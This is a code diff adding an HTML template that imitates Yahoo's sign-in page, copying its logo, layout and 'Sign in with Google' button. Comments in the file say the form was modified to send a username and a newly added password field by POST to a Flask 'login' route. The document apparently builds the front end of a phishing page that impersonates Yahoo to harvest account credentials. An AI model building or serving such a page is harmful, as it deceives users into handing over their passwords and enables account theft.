@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yahoo - Sign in</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f5f8fa;
+            color: #26282a;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            min-height: 100vh;
+            padding: 20px 16px;
+        }
+
+        .header {
+            width: 100%;
+            max-width: 1000px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 0;
+        }
+
+        /* Official Yahoo Logo */
+        .yahoo-logo {
+            height: 32px;
+            width: auto;
+        }
+
+        .help-link {
+            font-size: 14px;
+            color: #188fff;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .help-link:hover {
+            text-decoration: underline;
+        }
+
+        .card {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 360px;
+            border-radius: 8px;
+            padding: 32px 28px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .card-logo {
+            height: 28px;
+            width: auto;
+            margin-bottom: 20px;
+        }
+
+        .title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #26282a;
+            margin-bottom: 4px;
+            text-align: center;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #6e7780;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+
+        .login-form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .input-group {
+            position: relative;
+            width: 100%;
+        }
+
+        .input-field {
+            width: 100%;
+            height: 44px;
+            padding: 8px 12px;
+            border: 1px solid #b9c1c7;
+            border-radius: 2px;
+            font-size: 15px;
+            outline: none;
+            color: #26282a;
+            background-color: #ffffff;
+            transition: border-color 0.2s;
+        }
+
+        .input-field:focus {
+            border-color: #188fff;
+        }
+
+        .btn-next {
+            width: 100%;
+            height: 44px;
+            background-color: #188fff;
+            border: none;
+            border-radius: 22px;
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: background-color 0.2s;
+        }
+
+        .btn-next:hover {
+            background-color: #0077e6;
+        }
+
+        /* Checkbox Row */
+        .stay-signed-in {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            color: #26282a;
+            margin-top: 4px;
+        }
+
+        .stay-signed-in input {
+            width: 16px;
+            height: 16px;
+            accent-color: #188fff;
+            cursor: pointer;
+        }
+
+        .forgot-link {
+            font-size: 14px;
+            color: #188fff;
+            text-decoration: none;
+            text-align: center;
+            margin-top: 12px;
+            font-weight: 500;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .btn-create {
+            width: 100%;
+            height: 44px;
+            background-color: #ffffff;
+            border: 1px solid #188fff;
+            border-radius: 22px;
+            color: #188fff;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 16px;
+            transition: background-color 0.2s;
+        }
+
+        .btn-create:hover {
+            background-color: #f0f7ff;
+        }
+
+        /* Divider */
+        .divider {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            margin: 16px 0;
+            color: #828a93;
+            font-size: 12px;
+        }
+
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #e0e4e8;
+        }
+
+        .divider span {
+            padding: 0 8px;
+        }
+
+        .btn-google {
+            width: 100%;
+            height: 44px;
+            border-radius: 22px;
+            font-size: 14px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            cursor: pointer;
+            background-color: #ffffff;
+            color: #26282a;
+            border: 1px solid #b9c1c7;
+            transition: background-color 0.2s;
+        }
+
+        .btn-google:hover {
+            background-color: #f5f8fa;
+        }
+
+        .google-svg {
+            width: 18px;
+            height: 18px;
+        }
+
+        /* Footer */
+        .footer {
+            width: 100%;
+            max-width: 1000px;
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            font-size: 12px;
+            color: #6e7780;
+            padding: 16px 0;
+        }
+
+        .footer a {
+            color: #6e7780;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <svg class="yahoo-logo" viewBox="0 0 160 40" fill="#6001d2" xmlns="http://www.w3.org/2000/svg">
+            <path d="M21.5 2L13.1 22.8H12.9L4.5 2H0l10.8 25.1v10.4h4.8V27.1L26 2h-4.5zm18.3 12.8c-4.9 0-8.2 3.6-8.2 8.8 0 5.2 3.3 8.8 8.2 8.8 4.9 0 8.2-3.6 8.2-8.8 0-5.2-3.3-8.8-8.2-8.8zm0 14c-2.4 0-3.9-2.1-3.9-5.2s1.5-5.2 3.9-5.2 3.9 2.1 3.9 5.2-1.5 5.2-3.9 5.2zm23.8-14c-4.9 0-8.2 3.6-8.2 8.8 0 5.2 3.3 8.8 8.2 8.8 4.9 0 8.2-3.6 8.2-8.8 0-5.2-3.3-8.8-8.2-8.8zm0 14c-2.4 0-3.9-2.1-3.9-5.2s1.5-5.2 3.9-5.2 3.9 2.1 3.9 5.2-1.5 5.2-3.9 5.2zm21.4-9.3c0-2.8-1.7-4.7-4.3-4.7-2.6 0-4.3 1.9-4.3 4.7v10.1h-4.8V15.2h4.5v2.2h.2c1-1.6 2.8-2.6 4.9-2.6 4.3 0 6.8 2.8 6.8 7.3v10.4h-4.8V19.5zm19.9-4.3c-4.9 0-8.2 3.6-8.2 8.8 0 5.2 3.3 8.8 8.2 8.8 4.9 0 8.2-3.6 8.2-8.8 0-5.2-3.3-8.8-8.2-8.8zm0 14c-2.4 0-3.9-2.1-3.9-5.2s1.5-5.2 3.9-5.2 3.9 2.1 3.9 5.2-1.5 5.2-3.9 5.2zm13.1-26.7h4.8v10.4h-4.8V2.5zm0 12.7h4.8v17.3h-4.8V15.2zm13.6-12.7h4.8v30h-4.8V2.5z"/>
+        </svg>
+        <a href="#" class="help-link">Help</a>
+    </header>
+
+    <main class="card">
+        <svg class="card-logo" viewBox="0 0 160 40" fill="#6001d2" xmlns="http://www.w3.org/2000/svg">
+            <path d="M21.5 2L13.1 22.8H12.9L4.5 2H0l10.8 25.1v10.4h4.8V27.1L26 2h-4.5zm18.3 12.8c-4.9 0-8.2 3.6-8.2 8.8 0 5.2 3.3 8.8 8.2 8.8 4.9 0 8.2-3.6 8.2-8.8 0-5.2-3.3-8.8-8.2-8.8zm0 14c-2.4 0-3.9-2.1-3.9-5.2s1.5-5.2 3.9-5.2 3.9 2.1 3.9 5.2-1.5 5.2-3.9 5.2zm23.8-14c-4.9 0-8.2 3.6-8.2 8.8 0 5.2 3.3 8.8 8.2 8.8 4.9 0 8.2-3.6 8.2-8.8 0-5.2-3.3-8.8-8.2-8.8zm0 14c-2.4 0-3.9-2.1-3.9-5.2s1.5-5.2 3.9-5.2 3.9 2.1 3.9 5.2-1.5 5.2-3.9 5.2zm21.4-9.3c0-2.8-1.7-4.7-4.3-4.7-2.6 0-4.3 1.9-4.3 4.7v10.1h-4.8V15.2h4.5v2.2h.2c1-1.6 2.8-2.6 4.9-2.6 4.3 0 6.8 2.8 6.8 7.3v10.4h-4.8V19.5zm19.9-4.3c-4.9 0-8.2 3.6-8.2 8.8 0 5.2 3.3 8.8 8.2 8.8 4.9 0 8.2-3.6 8.2-8.8 0-5.2-3.3-8.8-8.2-8.8zm0 14c-2.4 0-3.9-2.1-3.9-5.2s1.5-5.2 3.9-5.2 3.9 2.1 3.9 5.2-1.5 5.2-3.9 5.2zm13.1-26.7h4.8v10.4h-4.8V2.5zm0 12.7h4.8v17.3h-4.8V15.2zm13.6-12.7h4.8v30h-4.8V2.5z"/>
+        </svg>
+
+        <h1 class="title">Sign in</h1>
+        <p class="subtitle">using your Yahoo Account</p>
+
+        <!-- MODIFIED FORM: action points to Flask route, POST method, inputs have names -->
+        <form class="login-form" action="{{ url_for('login') }}" method="POST">
+            <div class="input-group">
+                <input type="text" class="input-field" name="username" placeholder="Username, email, or mobile" required />
+            </div>
+
+            <!-- ADDED: Password field -->
+            <div class="input-group">
+                <input type="password" class="input-field" name="password" placeholder="Password" required />
+            </div>
+
+            <button type="submit" class="btn-next">Next</button>
+
+            <div class="stay-signed-in">
+                <input type="checkbox" id="persistent" checked />
+                <label for="persistent">Stay signed in</label>
+            </div>
+
+            <a href="#" class="forgot-link">Forgot username?</a>
+
+            <button type="button" class="btn-create">Create an account</button>
+        </form>
+
+        <div class="divider">
+            <span>or</span>
+        </div>
+
+        <button class="btn-google">
+            <svg class="google-svg" viewBox="0 0 24 24">
+                <path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.14h6.6c-.28 1.52-1.13 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.665-5.17 3.665-8.8z"/>
+                <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.12 0-5.77-2.1-6.72-4.93H1.26v3.15C3.25 21.3 7.31 24 12 24z"/>
+                <path fill="#FBBC05" d="M5.28 14.27c-.25-.72-.38-1.49-.38-2.27s.13-1.55.38-2.27V6.58H1.26C.46 8.17 0 9.99 0 12s.46 3.83 1.26 5.42l4.02-3.15z"/>
+                <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.31 0 3.25 2.7 1.26 6.58l4.02 3.15c.95-2.83 3.6-4.98 6.72-4.98z"/>
+            </svg>
+            Sign in with Google
+        </button>
+    </main>
+
+    <footer class="footer">
+        <a href="#">Terms</a>
+        <span>|</span>
+        <a href="#">Privacy</a>
+    </footer>
+
+</body>
+</html>
